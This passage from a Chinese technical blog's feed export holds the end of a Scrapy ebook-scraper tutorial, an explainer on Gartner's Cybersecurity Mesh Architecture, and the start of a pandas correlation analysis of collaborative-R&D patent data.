scrapy</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KgbookItem</span><span class="params">(scrapy.Item)</span>:</span></span><br><span class="line">    book_name=scrapy.Field()</span><br><span class="line">    book_author=scrapy.Field()</span><br><span class="line">    book_file=scrapy.Field()</span><br><span class="line">    book_url=scrapy.Field()</span><br></pre></td></tr></table></figure><h4 id="下载数据"><a href="#下载数据" class="headerlink" title="下载数据"></a>下载数据</h4><p>通过pipelines定义文件下载的管道类<br>pipelines.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> item, Request</span><br><span class="line"><span class="keyword">from</span> scrapy.pipelines.files <span class="keyword">import</span> FilesPipeline</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KgBookFilePipeline</span><span class="params">(FilesPipeline)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_media_requests</span><span class="params">(self,item,info)</span>:</span></span><br><span class="line">        <span class="keyword">yield</span> Request(item[<span class="string">'book_url'</span>],meta=&#123;<span class="string">'book_file'</span>:item[<span class="string">'book_file'</span>]&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">file_path</span><span class="params">(self, request, response=None, info=None)</span>:</span></span><br><span class="line">        file_name=request.meta.get(<span class="string">'book_file'</span>)</span><br><span class="line">        <span class="keyword">return</span> file_name</span><br></pre></td></tr></table></figure><p>这里实际上只做两件事，一是get_media_requests下载文件，二是组织文件要保存的路径。会通过相应的下载中间件将文件下载并保存在需要保存的目录。这里我们规划的保存目录是书籍目录\书名.类型。<br>还需要在settings.py中定义下载后保存的路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 保存书籍的路径</span></span><br><span class="line">FILES_STORE=<span class="string">'./books'</span></span><br><span class="line"><span class="comment"># 定义自定义下载的管道</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">   <span class="string">"getbooks.pipelines.KgBookFilePipeline"</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加入以下定义，强制爬取、下载，并忽略301,302重定向</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Obey robots.txt rules</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">MEDIA_ALLOW_REDIRECTS = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">HTTPERROR_ALLOWED_CODES = [<span class="number">301</span>,<span class="number">302</span>]</span><br></pre></td></tr></table></figure><p>至此，就通过Scrapy爬虫框架实现了一个爬虫。<br>运行效果<br>执行 <code>scrapy crawl getkgbook -o books.json</code><br>可以看到控制台打印出来的日志，爬虫开始默默的勤勤恳恳的爬取了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230912/3-scrapy%E7%88%AC%E5%8F%96%E6%97%A5%E5%BF%97.png" alt="爬取日志"></p><p>爬取的结果保存到了books.json中<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230912/4-books.json.png" alt="books.json"></p><p>要下载的书籍也保存到了books下相应的目录下了<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230912/5-%E4%BF%9D%E5%AD%98%E7%9A%84%E6%96%87%E4%BB%B6.png" alt="保存的文件"></p><h2 id="三、注意事项"><a href="#三、注意事项" class="headerlink" title="三、注意事项"></a>三、注意事项</h2><p>有可能在文件下载的时候并没有把文件下载下来，原因是文件下载路径有重定向。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2023</span><span class="literal">-09</span><span class="literal">-12</span> <span class="number">22</span>:<span class="number">25</span>:<span class="number">38</span> [<span class="type">scrapy.core.engine</span>] DEBUG: Crawled (<span class="number">301</span>) &lt;GET https://kgbook.com/e/DownSys/GetDown?classid=<span class="number">24</span>&amp;id=<span class="number">471</span>&amp;pathid=<span class="number">0</span>&gt; (referer: None)</span><br><span class="line"><span class="number">2023</span><span class="literal">-09</span><span class="literal">-12</span> <span class="number">22</span>:<span class="number">25</span>:<span class="number">38</span> [<span class="type">scrapy.pipelines.files</span>] WARNING: File (code: <span class="number">301</span>): Error downloading file from &lt;GET https://kgbook.com/e/DownSys/GetDown?classid=<span class="number">24</span>&amp;id=<span class="number">471</span>&amp;pathid=<span class="number">0</span>&gt; referred <span class="keyword">in</span> &lt;None&gt;</span><br><span class="line"><span class="number">2023</span><span class="literal">-09</span><span class="literal">-12</span> <span class="number">22</span>:<span class="number">25</span>:<span class="number">38</span> [<span class="type">scrapy.core.engine</span>] DEBUG: Crawled (<span class="number">301</span>) &lt;GET https://kgbook.com/e/DownSys/GetDown?classid=<span class="number">24</span>&amp;id=<span class="number">4742</span>&amp;pathid=<span class="number">0</span>&gt; (referer: None)</span><br><span class="line"><span class="number">2023</span><span class="literal">-09</span><span class="literal">-12</span> <span class="number">22</span>:<span class="number">25</span>:<span class="number">38</span> [<span class="type">scrapy.pipelines.files</span>] WARNING: File (code: <span class="number">301</span>): Error downloading file from &lt;GET https://kgbook.com/e/DownSys/GetDown?classid=<span class="number">24</span>&amp;id=<span class="number">4742</span>&amp;pathid=<span class="number">0</span>&gt; referred <span class="keyword">in</span> &lt;None&gt;</span><br></pre></td></tr></table></figure><p>需要在settings.py中加入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MEDIA_ALLOW_REDIRECTS = <span class="literal">True</span>  <span class="comment">#直接下载</span></span><br><span class="line"></span><br><span class="line">HTTPERROR_ALLOWED_CODES = [<span class="number">301</span>,<span class="number">302</span>]  <span class="comment">#忽略重定向的报错信息</span></span><br></pre></td></tr></table></figure><p>现在我们通过一个Scrapy爬虫框架实例实现了网站的爬取，重代码量上看比python直接写少了很多，通用性也更强了。通过管道不仅仅可以将数据保持至json还可以保存到Excel、数据库等。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p> <center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全之认识网络安全网格架构（CSMA）</title>
      <link href="/posts/d236743/"/>
      <url>/posts/d236743/</url>
      
        <content type="html"><![CDATA[<p>“网络安全网格（CyberSecurity Mesh）”是 Gartner 提出的网络安全技术发展新趋势，近两年连续入选其年度重要战略技术趋势研究报告，成为当前网络安全领域流行的热词，受到网络安全从业者的高度关注。</p><h2 id="一、概念产生的背景"><a href="#一、概念产生的背景" class="headerlink" title="一、概念产生的背景"></a>一、概念产生的背景</h2><p>如今，由于现在平均每个企业在自己的网络上部署了多达45个安全解决方案，使得任何形式的集中管理都几乎无法实现。更糟糕的是，检测和响应网络事件需要在其中的19个工具之间进行协调，导致每次设备升级时都需要不断管理和重新配置。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230911/1-CSAM%E6%A6%82%E5%BF%B5.png" alt="CSMA概念背景"></p><p>仅仅依靠连接不同安全技术的变通方法是不够的，企业需要一个全面覆盖、深度集成和动态协同的“网络安全网格平台”，提供集中管理和可见性，支持在一个庞大的解决方案生态系统中协同运行，自动适应网络中的动态变化。</p><p>因此有了网络安全网格这个概念。</p><p>Gartner 发布的《2021 年重要战略技术趋势》（Top Strategic Technology Trends for 2021）中描述了网络安全网格的概念：“网络安全网格是一种分布式架构方法，能够实现可扩展、灵活和可靠的网络安全控制。现在许多资产存在于传统安全边界之外，网络安全网格本质上允许围绕人或事物的身份定义安全边界。通过集中策略编排和分布策略执行来实现更加模块化、更加快速响应的安全防护。”</p><p>在 Gartner 发布的《2022 年重要战略技术趋势 》（Top Strategic Technology Trends for 2022）中对网络安全网格概念有了进一步的说明：“数字业务资产分布在云和数据中心，基于边界的传统、分散的安全方法使组织容易遭受攻击。网络安全网格架构提供一种基于身份的可组合安全方法，以创建可扩展和可互操作的服务。通用的集成结构可以保护任务组织的任何资产，对于使用这样的一体化安全工具的组织来说，可将单项安全事件的财务影响平均减少 90%。”</p><p>从上述 Gartner 报告的描述中可以看出，网络安全网格是一种安全架构方法或者策略，而不是一种定义明确的架构或标准化的技术方法，更不是某种产品，其目的是找到能够应对不断发展的业务系统以及网络环境演变所带来的安全挑战的新方法，提供比传统物理边界防护更强大、更灵活和可扩展的安全能力。通过连接、集成和协同管理各种网络安全控制系统、服务和数据来提供综合安全保护的框架。它致力于构建一个灵活、弹性和动态的安全环境，以适应日益复杂和多样化的网络安全威胁。</p><h2 id="二、架构与实现"><a href="#二、架构与实现" class="headerlink" title="二、架构与实现"></a>二、架构与实现</h2><p>Gartner 提出了网络安全网格的具体实现框架，即网络安全网格架构（CyberSecurity Mesh Architecture，CSMA）。这是一种分布式安全服务的协作框架，提供安全分析与情报、统一策略管理、整合操控界面和分布式身份结构等 4个安全基础设施使不同的安全工具能够基于该基础设施协同工作并实现统一的配置和管理，提高安全工具的可组合性、可扩展性和互操作性，解决多种安全工具在各个孤立体系中运行时所带来的问题，实现各种安全能力的有机聚合，适应业务发展需要并达到“力量倍增”的效果。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230911/3-CSMA%E6%9E%B6%E6%9E%842.png" alt="CSMA架构图"><br>网络安全网格架构的组成如上图图所示，4 个基础支撑层之间以及与其他安全系统之间的关系如下：</p><ol><li>安全分析与情报层。可与来自第三方的安全工具开展联合协同检测，基于丰富的威胁分析手段，结合威胁情报，利用机器学习等技术形成更加准确一致的威胁分析结果。</li><li>统一策略管理层。主要包括安全策略编排和安全态势管理，将集中的策略转换为各个安全工具的本地配置策略，实现分布式执行，并支持动态策略管理服务。</li><li>整合操控界面层。实现安全数据可视化，提供安全系统复合视图，主要包括统一的控制面板、告警、审查、指导手册和报告等，使安全团队能够更快速、更有效地响应安全事件。</li><li>身份架构层。主要提供目录服务、自适应访问以及去中心化的身份管理、身份验证和授权管理等功能，支撑构建适合用户需求的零信任网络架构。</li></ol><p>网络安全网格是在物理网络之上构建的逻辑层，网络安全架构的应用视图如下图所示，直观展示了在逻辑层中通过对各种安全能力的编排、执行，使得各种安全工具基于 4 个安全基础层实现互操作，提供统一的安全管控和可见性，而不是在孤岛中运行每个安全工具，从而构建一个能在庞大的安全生态中协同运行，且自动适应网络环境演化的安全平台。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230911/4-CSMA%E6%9E%B6%E6%9E%843.png" alt="CSMA应用视图"></p><h2 id="三、主要特点"><a href="#三、主要特点" class="headerlink" title="三、主要特点"></a>三、主要特点</h2><p>网络安全网格主要涉及设计和建设 IT 安全基础设施，采用“水平”分布式方式将各种安全能力集成到网络中，而不是采用传统的“自上而下”、各种安全设备“一应俱全”的集成方式，致力于构建一个能在庞大的安全生态系统中协同运行，且自动适应网络环境演化的全面覆盖、统一管控、动态协同和快速响应的安全平台。</p><ul><li><p>通用集成框架。网络安全网格提供一种通用的集成框架和方法，实现类似“乐高”化思维的灵活、可组合、可扩展的安全架构。通过标准化工具支持可互操作的各种安全服务编排和协同，从而实现广泛分布的不同安全服务的高效集成，建立起合作的安全生态系统来保护处于本地、数据中心和云中的数字资产，并基于数据分析、情报支持和策略管理等能力的聚合形成更加强大的整体安全防御和响应处置能力。</p></li><li><p>分布式网络架构。网络安全网格利用了“网格”的去中心化、对等协作、结构灵活、连接可靠、扩展性强等优势，不再侧重于围绕所有设备或节点构建“单一”边界，而是围绕每个接入点创建更小的、单独的边界 [5-6]。通过建立与接入点同样多的安全边界，保证物理位置广泛分布的用户能随时随地安全接入，符合零信任网络中的“微分段”要求，使得网络犯罪分子和黑客更难利用整个网络。同时，网络中主客体之间在逻辑上都是点对点直连关系，无须关注具体的物理网络部署，能够简化安全配置且能自动适应网络动态变化。</p></li><li><p>集中管理与分散执行。与传统的网关集中访问控制不同，网络安全网格采用了集中的策略编排和权限管理，基于策略分布式的执行，将网络安全控制能力分布到网络的更多地方，使安全措施更接近需要保护的资产，一方面，有利于消除安全管控盲点，缓解传统集中安全控制存在的性能处理瓶颈，适应用户终端和组织业务分散化发展需要；另一方面，有利于实现全局的安全威胁分析，形成更加一致的安全态势，从而实现更加精准的安全管控和更加快速的响应处置。</p></li><li><p>围绕身份定义安全边界。在当前网络协议中，因缺失身份要素带来了很多安全问题，物理 IP 地址与人和终端的关联性越来越弱，导致基于地址、流量、日志的安全检测和威胁分析技术难以实现针对人的威胁研判；基于网络协议字段特征检测的传统边界访问控制技术，同样使得基于身份的授权访问成为天方夜谭。由于网络威胁本质上是人带来的威胁，因此难以实现精准高效的安全威胁处置。网络安全网格延续了零信任网络的思想，用身份定义网络边界，让身份成为威胁研判与安全管控的基础。</p></li></ul><h2 id="四、应用场景"><a href="#四、应用场景" class="headerlink" title="四、应用场景"></a>四、应用场景</h2><p><strong>网络安全网格的应用场景包括：</strong></p><ol><li>云安全：网络安全网格可用于跨多个云环境提供综合的安全管理和保护，确保云服务的安全性和合规性。</li><li>边缘安全：网络安全网格可以应用于边缘计算环境，以提供安全的边缘设备管理、数据保护和边缘网络保护。</li><li>供应链安全：通过网络安全网格，可以实现供应链中各个环节的安全协同，共享安全信息，降低供应链中的安全风险。</li><li>物联网安全：网络安全网格可以为物联网设备和系统提供统一的安全管理和保护，保障物联网环境的安全性和可信度。</li></ol><h2 id="五、价值和优势"><a href="#五、价值和优势" class="headerlink" title="五、价值和优势"></a>五、价值和优势</h2><p><strong>网络安全网格的主要价值包括：</strong></p><ol><li>综合安全保护：网络安全网格可以集成多个安全控制系统和服务，提供全面的安全保护，从网络边界到终端设备，覆盖各个层面和环节的安全需求。</li><li>动态适应能力：网络安全网格具备弹性和动态适应的特性，能够快速识别和响应新的威胁，并自动调整安全策略和控制措施以提供即时和有效的保护。</li><li>协同合作：网络安全网格促进了不同安全系统和服务之间的协同合作和信息共享。通过共享威胁情报和安全事件信息，提高整体的安全防御能力，并加强各方之间的合作与配合。</li><li>可扩展性和灵活性：网络安全网格具备高度的可扩展性，可以根据实际需求快速部署和调整安全控制系统，适用于各种规模和复杂度的网络环境。</li></ol><p><strong>网络安全网格与传统网络安全方法在以下几个方面存在区别：</strong></p><ol><li>集成性：传统网络安全方法通常是独立而孤立的解决方案，每个安全设备或系统都有自己的管理界面和策略。而网络安全网格强调集成不同的安全控制系统和服务，通过连接和协同工作来提供综合的安全保护，实现整体的安全扩展性和一致性。</li><li>动态适应性：传统网络安全方法通常是静态的，在部署后很少变动，而网络安全网格具备弹性和动态适应的特性。它可以根据实际需求自动调整安全策略和控制措施，灵活应对不断变化的威胁环境。</li><li>协同合作：传统网络安全方法主要依赖于各个安全设备或系统的独立工作，缺乏跨系统的协同合作。而网络安全网格通过实现安全控制系统和服务之间的协同和信息共享，提高整体的安全防御能力，并加强各方之间的合作与配合。</li><li>统一视图和管理：传统网络安全方法通常需要使用多个不同的管理界面来管理各个安全设备或系统，使得安全管理变得复杂而繁琐。而网络安全网格提供统一的视图和管理平台，使得管理员可以更便捷地管理和监控整个安全环境，提高管理效率和反应速度。</li><li>灵活性和可扩展性：传统网络安全方法在部署和扩展时通常需要考虑设备间的兼容性和差异性。而网络安全网格具备高度的灵活性和可扩展性，可以根据实际需求灵活部署和调整安全控制系统，适用于各种规模和复杂度的网络环境。</li></ol><p><strong>网络安全网格架构的优势主要体现以下几个方面：</strong></p><ol><li>实现更加可靠的安全防御。网络安全网格摒弃了传统的边界防护思想，不仅是围绕网络数据中心、服务中心构建“边界”，还围绕每个接入点创建更小的、独立的边界，并由集中的控制中心进行统一管理，从而将安全控制扩展到广泛分布的资产，在提高威胁应对能力的同时，增强了安全系统的可扩展性、灵活性和弹性。</li><li>应对复杂环境下的安全需求。通过网络安全策略集中编排但分散执行的方法，在统一的安全策略控制下，提供一种灵活且易于扩展的安全基础架构，可为混合云和多云等复杂环境中的资产保护提供所需的安全能力。</li><li>实现更加高效的威胁处置。通过安全工具集成，加强了安全数据采集和预测分析之间的协作，可以更加快速、准确地获取安全态势，及时发现并应对安全威胁，可大幅度增强对违规和攻击事件的响应处置能力。</li><li>构建更加开放的安全架构。提供了一种可编排的通用集成框架和方法，支持各类安全服务之间的协同工作，用户可自主选择当前和新兴的安全技术与标准，面向云原生和应用程序接口（Application Programming Interface，API） 插 件的环境更加易于集成，便于定制与扩展，能有效弥补不同供应商安全方案之间的能力差距。</li><li>降低建设维护的成本与难度。用户可以有效减少管理一组庞大的孤立安全解决方案的开销，同时，安全能力部署和维护所需的时间更少、成本更低，易于与用户已建设的身份识别与访问管理（Identity and Access Management，IAM）、安全信息和事件管理（Security Information and Event Management，SIEM）、 安 全运营中心（Security Operations Center，SOC）、态势感知等安全系统共存，也方便对接已建设的专线、软件定义广域网（Software-Defined Wide Area Network，SD-WAN）等网络服务。</li></ol><hr><p> 博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p> <center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python进行数据相关性分析实战</title>
      <link href="/posts/cd0f90f9/"/>
      <url>/posts/cd0f90f9/</url>
      
        <content type="html"><![CDATA[<p>平时在做数据分析的时候，会要对特征进行相关性分析，分析某些特征之间是否存在相关性。本文将通过一个实例来对数据进行相关性分析与展示。</p><h2 id="一、数据集介绍"><a href="#一、数据集介绍" class="headerlink" title="一、数据集介绍"></a>一、数据集介绍</h2><p>本次分析的是企业合作研发模式效果分析，企业的合作研发大致分为 企企合作、企学合作、企研合作、企学研合作，也就是企业与企业合作研发、企业与大学合作研发、企业与研究所合作研法、企业联合学校、研究所共同合作研发。现在就是想通过数据分析来看看那种合作研发模式的效果最好，产出最佳。</p><p>数据集是从公开网站获取的公开的专利信息，包括专利的公告日期、专利评分、专利估值，这些指标说明了专利的价值。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E7%A0%94%E5%8F%91%E4%B8%93%E5%88%A9%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="专利数据集"></p><h2 id="二、数据整理和探索"><a href="#二、数据整理和探索" class="headerlink" title="二、数据整理和探索"></a>二、数据整理和探索</h2><p>有了数据后先对数据进行整理，在这里我们用II表示企企合作、IU表示企学合作、IR表示企研合作、IUR表示企学研合作。<br>先导入python数据分析三大件numpy、pandas、matplotlib</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">plt.rcParams[<span class="string">"font.sans-serif"</span>]=[<span class="string">"SimHei"</span>] <span class="comment">#设置字体</span></span><br><span class="line">plt.rcParams[<span class="string">"axes.unicode_minus"</span>]=<span class="literal">False</span> <span class="comment">#该语句解决图像中的“-”负号的乱码问题</span></span><br></pre></td></tr></table></figure><p>对数据进行整理，将“有效”的数据检索出来，将合作研发的模式标识出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">II_data_original=pd.read_excel(<span class="string">r'./data/绿色低碳专利企企合作申报总数据_21578_2023-03-11.xlsx'</span>) <span class="comment">#企企合作</span></span><br><span class="line">IU_data_original=pd.read_excel(<span class="string">r'./data/绿色低碳专利企学合作申报总数据_6451_2023-03-11.xlsx'</span>)  <span class="comment">#企学合作</span></span><br><span class="line">IR_data_original=pd.read_excel(<span class="string">r'./data/绿色低碳专利企研合作申报总数据_1706_2023-03-11.xlsx'</span>)  <span class="comment">#企研合作</span></span><br><span class="line">IUR_data_original=pd.read_excel(<span class="string">r'./data/绿色低碳专利企学研合作申报总数据_241_2023-03-11.xlsx'</span>)  <span class="comment">#企学研合作</span></span><br><span class="line">II_data_original[<span class="string">'class_type'</span>]=<span class="string">'II'</span></span><br><span class="line">IU_data_original[<span class="string">'class_type'</span>]=<span class="string">'IU'</span></span><br><span class="line">IR_data_original[<span class="string">'class_type'</span>]=<span class="string">'IR'</span></span><br><span class="line">IUR_data_original[<span class="string">'class_type'</span>]=<span class="string">'IUR'</span></span><br><span class="line">data_original=II_data_original.append([IU_data_original,IR_data_original,IUR_data_original])</span><br><span class="line">data_original=data_original[(data_original.法律有效性==<span class="string">'有效'</span>)]</span><br><span class="line">data_original</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E7%A0%94%E5%8F%91%E5%90%88%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A0%87%E7%AD%BE.png" alt="合作研发的模式标识"><br>对日期进行处理，我们以年度为单位来分析每年各企业合作研发模式的数据，所以将日期处理成“年”为单位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#处理日期</span></span><br><span class="line">data_original[<span class="string">'date'</span>]=pd.to_datetime(data_original[<span class="string">'公开(公告)日'</span>],format=<span class="string">"%Y%m%d"</span>)</span><br><span class="line">data_original[<span class="string">'year'</span>]=data_original[<span class="string">'date'</span>].dt.strftime(<span class="string">'%Y'</span>)</span><br><span class="line">data_original</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E5%B9%B4%E4%BB%BD%E6%A0%87%E7%AD%BE.png" alt="年份标签"></p><p>我们只需要分析相应的专利质量的指标，这里与专利质量相关的指标大致为引文数量、专利估值、专利评分。然后以年度为单位来看看数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">data_group=data_original.groupby([<span class="string">'year'</span>,<span class="string">'class_type'</span>]).size()</span><br><span class="line">df_data_group=data_group.unstack()</span><br><span class="line">data_group_count=data_original.groupby([<span class="string">'year'</span>]).size()</span><br><span class="line">data_group_quotecount=data_original[[<span class="string">'year'</span>,<span class="string">'引文数量总计'</span>]].groupby([<span class="string">'year'</span>]).sum()  <span class="comment">#引文数量</span></span><br><span class="line">data_group_value=data_original[[<span class="string">'year'</span>,<span class="string">'专利估值'</span>]].groupby([<span class="string">'year'</span>]).mean() <span class="comment">#专利估值</span></span><br><span class="line">data_group_grade=data_original[[<span class="string">'year'</span>,<span class="string">'专利评分'</span>]].groupby([<span class="string">'year'</span>]).mean() <span class="comment">#专利评分grade</span></span><br><span class="line">df_data_group[<span class="string">'count'</span>]=data_group_count</span><br><span class="line">df_data_group[<span class="string">'quotecount'</span>]=data_group_quotecount</span><br><span class="line">df_data_group[<span class="string">'value'</span>]=data_group_value</span><br><span class="line">df_data_group[<span class="string">'grade'</span>]=data_group_grade</span><br><span class="line">df_data_group</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E5%90%88%E4%BD%9C%E7%A0%94%E5%8F%91%E6%95%B0%E6%8D%AE.png" alt="合作研发数据"></p><p>历年（2004-2022年）专利的合作模式的专利数量增长趋势</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df_data_group.plot.bar(y=[<span class="string">'II'</span>,<span class="string">'IR'</span>,<span class="string">'IU'</span>,<span class="string">'IUR'</span>],figsize=(<span class="number">32</span>,<span class="number">4</span>),stacked=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E5%90%88%E4%BD%9C%E6%A8%A1%E5%BC%8F%E7%9A%84%E4%B8%93%E5%88%A9%E6%95%B0%E9%87%8F%E5%A2%9E%E9%95%BF%E8%B6%8B%E5%8A%BF.png" alt="合作模式的专利数量增长趋势"></p><p>历年（2015-2022年）的合作模式的专利数量对比情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df_data_group[<span class="string">'2015'</span>:<span class="string">'2022'</span>].plot.bar(y=[<span class="string">'II'</span>, <span class="string">'IR'</span>, <span class="string">'IU'</span>, <span class="string">'IUR'</span>], figsize=(<span class="number">32</span>, <span class="number">4</span>))</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E5%90%88%E4%BD%9C%E6%A8%A1%E5%BC%8F%E7%9A%84%E4%B8%93%E5%88%A9%E6%95%B0%E9%87%8F%E5%AF%B9%E6%AF%94%E6%83%85%E5%86%B5.png" alt="合作模式的专利数量对比情况"></p><p>从数据上可以看出，从2004年-2021年前些年，企业的研发模式是比较单一的，2004-2008年大部分都是企企合作的研发模式，其他研发模式先对比较少。从2004年-2021年，随着我国企业对研发的投入力度也来越大，专利的数量是逐年递增的，研发模式也逐步的多样化起来，但还是以企企合作和企学合作为主。</p><h2 id="三、数据相关性分析与展示"><a href="#三、数据相关性分析与展示" class="headerlink" title="三、数据相关性分析与展示"></a>三、数据相关性分析与展示</h2><p>因为从数据上看，从2015年以后各种研发模式逐步的多样化起来，所以我们来看一下2015年以后研发模式与研发质量各项指标的相关性。<br>通过numpyde的corrcoef()方法可以很方便的计算出各个特征之间的相关性系数，得出相关性矩阵。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ruslut=np.corrcoef(df_data_group[<span class="string">'2015'</span>:<span class="string">'2022'</span>],rowvar=<span class="literal">False</span>)</span><br><span class="line">ruslut</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E7%9B%B8%E5%85%B3%E6%80%A7%E7%9F%A9%E9%98%B5.png" alt="相关性矩阵"></p><p>看数据肯定没有看图形直观，所以我们将这个相关性矩阵进行可视化的展示。这里用seaborn来做数据的图形化展示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line">figure, ax = plt.subplots(figsize=(<span class="number">12</span>, <span class="number">12</span>))</span><br><span class="line">df=df_data_group[<span class="string">'2015'</span>:<span class="string">'2022'</span>]</span><br><span class="line">sns.heatmap(df.corr(), square=<span class="literal">True</span>, annot=<span class="literal">True</span>, ax=ax)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E7%9B%B8%E5%85%B3%E6%80%A7%E7%9F%A9%E9%98%B5%E5%9B%BE.png" alt="相关性矩阵图形化展示"></p><p>这里可以看出企企合作和企学合作的数量相关性比较高，而企研合作value和grade具有相关性，说明企研合作模式的研发质量相对来说比较好。</p><p>最后，我们来看一下专利TOP20的单位研发类型分布、估值TOP20的专利的研发类型分布、评分TOP20的专利、研发类型的分布。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">data_countbyComp=data_original[[<span class="string">'第一申请人-原文'</span>,<span 